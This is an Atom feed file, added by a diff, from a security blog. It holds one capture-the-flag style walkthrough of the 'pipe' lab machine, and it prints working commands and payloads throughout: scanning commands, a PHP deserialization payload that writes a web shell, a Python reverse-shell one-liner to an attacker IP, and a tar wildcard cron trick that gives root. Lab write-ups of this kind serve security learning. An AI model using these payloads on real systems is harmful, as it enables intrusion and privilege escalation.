@@ -1,0 +1,208 @@
+<?xml version="1.0" encoding="utf-8"?>
+<feed xmlns="http://www.w3.org/2005/Atom">
+
+  <title><![CDATA[Category: php serialization | Bob1Bob2]]></title>
+  <link href="http://wg135.github.io/blog/categories/php-serialization/atom.xml" rel="self"/>
+  <link href="http://wg135.github.io/"/>
+  <updated>2016-08-24T14:39:29-05:00</updated>
+  <id>http://wg135.github.io/</id>
+  <author>
+    <name><![CDATA[Bob1Bob2]]></name>
+    
+  </author>
+  <generator uri="http://octopress.org/">Octopress</generator>
+
+  
+  <entry>
+    <title type="html"><![CDATA[pipe]]></title>
+    <link href="http://wg135.github.io/blog/2016/08/23/pipe/"/>
+    <updated>2016-08-23T01:31:51-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/08/23/pipe</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Burp</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<p><a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt">Tar arbitrary command execution</a></p>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code>
+<img src="/images/blog/vulhub/pipe/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.163 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.163 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>there are 4 ports are opening</p>
+
+<p>use nikto to scan</p>
+
+<p><code>nikto -h 192.168.41.162</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>shows there is an <code>index.php</code> but needs autherication</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use wfuzz to scan</p>
+
+<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  --hc 401 http://192.168.41.163/FUZZ 2&gt;/dev/null</code></p>
+
+<p>get a path <code>scriptz</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find a file <code>log.php.BAK</code>, looks like backup file of log.php</p>
+
+<pre><code class="php">&lt;?php
+class Log
+{
+    public $filename = '';
+    public $data = '';
+
+    public function __construct()
+    {
+        $this-&gt;filename = '';
+        $this-&gt;data = '';
+    }
+
+    public function PrintLog()
+    {
+        $pre = "[LOG]";
+        $now = date('Y-m-d H:i:s');
+
+        $str = '$pre - $now - $this-&gt;data';
+        eval("\$str = \"$str\";");
+        echo $str;
+    }
+
+    public function __destruct()
+    {
+        file_put_contents($this-&gt;filename, $this-&gt;data, FILE_APPEND);
+    }
+}
+?&gt;
+</code></pre>
+
+<p>in order to check if the authentication can be bypassed, I use <code>http method tamper</code>.</p>
+
+<p><code>nmap -p 80 --script http-method-tamper --script-args 'http-method-tamper.paths={/index.php}' 192.168.41.163</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>It&rsquo;s vulnerable to POST method.</p>
+
+<p>Use Burp to change GET request to /index.php to POST request, and get the page:</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the source code:</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>The page will load <code>scriptz/php.js</code>, and it serialises some data. Based on the log.php.BAK code,</p>
+
+<p>click link <code>Show Artist Info</code>, get the url, after decoding:</p>
+
+<p><code>O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The+Treachery+of+Images";}</code></p>
+
+<p>The “Info” function looks like a way to read information from a specific file. Recheck the log.php.BAK file, find it use <code>file_put_contents($this-&gt;filename, $this-&gt;data, FILE_APPEND)</code> to write data to a file.</p>
+
+<p>Test if it can write to a Log file</p>
+
+<p><code>param=O:3:"Log":2:{s:8:"filename";s:8:"Test.txt";s:4:"data";s:4:"TEST";}</code></p>
+
+<p>doesn&rsquo;t work</p>
+
+<p><code>param=O:3:"Log":2:{s:8:"filename";s:30:"/var/www/html/scriptz/Test.txt";s:4:"data";s:4:"TEST";}</code></p>
+
+<p>works</p>
+
+<p>based on that, build payload:</p>
+
+<p><code>param=O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:60:" &lt;?php echo '&lt;pre&gt;'; system($_GET['cmd']); echo '&lt;/pre&gt;'; ?&gt;";}</code></p>
+
+<p>replace the parameter in Burp. forward the traffic</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>then:</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>webshell is there.</p>
+
+<p>setup backdoor:</p>
+
+<p><code>http://192.168.41.163/scriptz/shell.php?cmd=python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.41.149",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></p>
+
+<p>get the shell:</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p>try to find linux kernel local exploit, but I find there is no gcc in the box.</p>
+
+<p>keep looking.</p>
+
+<p>find</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like system does backup automatically. check <code>/etc/crontab</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>/usr/bin/compress.sh</code> can be read</p>
+
+<p>I find the tar uses wild card. Here I will try Tar arbitrary command execution.</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>first check which shell is being use in target</p>
+
+<p><code>ls -al /bin/*sh</code></p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>start to create shell:</p>
+
+<pre><code>www-data@pipe:/home/rene/backup$ echo &gt; --checkpoint=1;                    
+www-data@pipe:/home/rene/backup$ echo &gt; --checkpoint-action=exec=sh\ shell.sh;                     
+www-data@pipe:/home/rene/backup$ echo 'chmod u+s /bin/dash' &gt; shell.sh
+www-data@pipe:/home/rene/backup$ echo 'touch /home/rene/backup/done' &gt;&gt; shell.sh                     
+www-data@pipe:/home/rene/backup$ cat shell.sh
+chmod u+s /bin/dash
+touch /home/rene/backup/done
+www-data@pipe:/home/rene/backup$ chmod +x shell.sh
+</code></pre>
+
+<p>just wait a few miniutes and a file <code>done</code> will be created</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>run <code>/bin/dash</code> and get the shell</p>
+
+<p><img src="/images/blog/vulhub/pipe/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+</feed>
